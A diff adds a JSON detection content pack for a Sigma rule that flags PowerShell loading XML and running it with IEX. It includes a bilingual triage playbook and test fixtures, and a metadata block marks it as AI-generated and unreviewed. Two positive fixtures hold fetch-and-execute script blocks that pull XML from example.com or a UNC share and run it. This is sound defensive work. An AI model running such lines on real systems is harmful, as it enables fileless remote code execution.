@@ -1,0 +1,138 @@
+{
+  "rule": {
+    "id": "6c6c6282-7671-4fe9-a0ce-a2dcebdc342b",
+    "title": "Powershell XML Execute Command",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/powershell/powershell_script/posh_ps_xml_iex.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/powershell/powershell_script/posh_ps_xml_iex.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un script block de PowerShell creó un objeto System.Xml.XmlDocument, cargó un documento XML y ejecutó código dinámico con IEX, Invoke-Expression o Invoke-Command. Puede indicar que se descargó un comando oculto en XML y se ejecutó.",
+      "what_it_detects": "Eventos 4104 (Script Block Logging) cuyo ScriptBlockText contiene a la vez 'New-Object', 'System.Xml.XmlDocument' y '.Load', junto con 'IEX ', 'Invoke-Expression ', 'Invoke-Command ' o 'ICM -'.",
+      "why_it_matters": "Esta técnica (T1059.001, PowerShell) permite guardar comandos dentro de un XML local o remoto y ejecutarlos en memoria. Así evita escribir scripts en disco y oculta el payload real en un archivo que parece inofensivo.",
+      "triage_steps": [
+        "Lea el ScriptBlockText completo y reconstruya los fragmentos con el mismo ScriptBlockId (MessageNumber/MessageTotal).",
+        "Identifique el origen de .Load(): URL, ruta UNC o archivo local. Revise la reputación del dominio o IP y si el XML sigue disponible.",
+        "Determine qué nodo del XML se pasa a IEX/Invoke-Expression y si hay ofuscación, Base64 u otros script blocks que decodifiquen contenido.",
+        "Busque en la telemetría de procesos (4688/Sysmon 1) el powershell.exe del host: revise CommandLine, ParentImage y si usó -exec bypass, -nop o -w hidden.",
+        "Revise el tráfico de red y DNS del host en +/- 15 minutos hacia el origen del XML y hacia otros destinos nuevos.",
+        "Verifique el usuario que ejecutó el script, si debería tener ese permiso y si hubo inicios de sesión anómalos antes del evento.",
+        "Busque alertas previas del mismo host o usuario y el mismo patrón en otros endpoints."
+      ],
+      "false_positives": [
+        "Scripts administrativos legítimos que leen configuración XML y ejecutan comandos definidos en ella.",
+        "Herramientas de despliegue o automatización internas que usan Invoke-Command con parámetros cargados desde XML.",
+        "Pruebas de Atomic Red Team u otros ejercicios de red team autorizados."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del host o del script si la ejecución es esperada. Si es legítima, documente la excepción por ruta o hash.",
+        "Si es maliciosa, aísle el endpoint y bloquee en el proxy o el firewall el dominio o la IP del XML.",
+        "Recolecte el XML, los script blocks, la memoria del proceso y los artefactos de persistencia antes de remediar.",
+        "Elimine la persistencia identificada, restablezca las credenciales del usuario afectado y busque el mismo origen en toda la flota."
+      ],
+      "severity_rationale": "Es media porque el patrón es típico de ejecución remota sin archivos, aunque también aparece en scripts administrativos legítimos y requiere contexto."
+    },
+    "en": {
+      "summary": "A PowerShell script block created a System.Xml.XmlDocument, loaded an XML document and ran dynamic code with IEX, Invoke-Expression or Invoke-Command. This may mean a command hidden in XML was downloaded and run.",
+      "what_it_detects": "Event 4104 (Script Block Logging) where ScriptBlockText contains 'New-Object', 'System.Xml.XmlDocument' and '.Load', together with 'IEX ', 'Invoke-Expression ', 'Invoke-Command ' or 'ICM -'.",
+      "why_it_matters": "This technique (T1059.001, PowerShell) lets attackers store commands in a local or remote XML file and run them in memory. No script is written to disk, and the real payload sits in a file that looks harmless.",
+      "triage_steps": [
+        "Read the full ScriptBlockText and rebuild any fragments that share the same ScriptBlockId (MessageNumber/MessageTotal).",
+        "Identify the .Load() source: URL, UNC path or local file. Check the domain or IP reputation and whether the XML is still reachable.",
+        "Determine which XML node is passed to IEX/Invoke-Expression and check for obfuscation, Base64 or other script blocks that decode content.",
+        "Find the host's powershell.exe in process telemetry (4688/Sysmon 1): check CommandLine, ParentImage and use of -exec bypass, -nop or -w hidden.",
+        "Review the host's network and DNS traffic within +/- 15 minutes, both to the XML source and to other new destinations.",
+        "Check which user ran the script, whether that user should be doing this, and whether any unusual logons came before it.",
+        "Look for earlier alerts on the same host or user, and for the same pattern on other endpoints."
+      ],
+      "false_positives": [
+        "Legitimate admin scripts that read XML configuration and run commands defined in it.",
+        "Internal deployment or automation tools that use Invoke-Command with parameters loaded from XML.",
+        "Atomic Red Team tests or other authorized red team exercises."
+      ],
+      "response_steps": [
+        "Ask the host or script owner whether the run was expected. If it is legitimate, document an exception by path or hash.",
+        "If it is malicious, isolate the endpoint and block the XML domain or IP at the proxy or firewall.",
+        "Before remediating, collect the XML, script blocks, process memory and persistence artifacts.",
+        "Remove any persistence you find, reset the affected user's credentials and hunt for the same source across the fleet."
+      ],
+      "severity_rationale": "Medium, because this pattern is typical of fileless remote execution but also shows up in legitimate admin scripts, so context is needed."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Atomic-style XML request: loads a remote XML and executes a node with IEX.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "UserID": "ANDES\\jperez",
+          "ScriptBlockId": "3f2a9c1e-8b47-4d0a-9e61-5c7b2d8f0a13",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "",
+          "ScriptBlockText": "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://example.com/cmd.xml');IEX $Xml.command.a.execute"
+        }
+      },
+      {
+        "description": "Script that loads an XML from a UNC share and runs its content via Invoke-Expression.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0207.andes.example.com",
+          "UserID": "ANDES\\mrojas",
+          "ScriptBlockId": "a91d4e72-06c3-4b5f-8d2e-7f13c9b0e845",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\upd.ps1",
+          "ScriptBlockText": "$d = New-Object -TypeName System.Xml.XmlDocument\n$d.Load('\\\\198.51.100.20\\share\\task.xml')\nInvoke-Expression $d.root.payload.'#text'"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate admin script that loads an XML config and reads values without dynamic execution.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "SRV-APP01.andes.example.com",
+          "UserID": "ANDES\\svc_deploy",
+          "ScriptBlockId": "5b8e0f3d-2c61-4a97-b1d4-9e0a6c7f2d58",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Scripts\\Read-AppConfig.ps1",
+          "ScriptBlockText": "$cfg = New-Object System.Xml.XmlDocument\n$cfg.Load('C:\\App\\config.xml')\n$port = $cfg.settings.port\nWrite-Output \"Port: $port\""
+        }
+      },
+      {
+        "description": "Invoke-Command used remotely without any XmlDocument loading.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "UserID": "ANDES\\admin.lgarcia",
+          "ScriptBlockId": "c4d7a1b9-3e82-4f06-a5c3-1b9e8d2f7a60",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Scripts\\Get-Uptime.ps1",
+          "ScriptBlockText": "Invoke-Command -ComputerName SRV-APP01 -ScriptBlock { (Get-CimInstance Win32_OperatingSystem).LastBootUpTime }"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
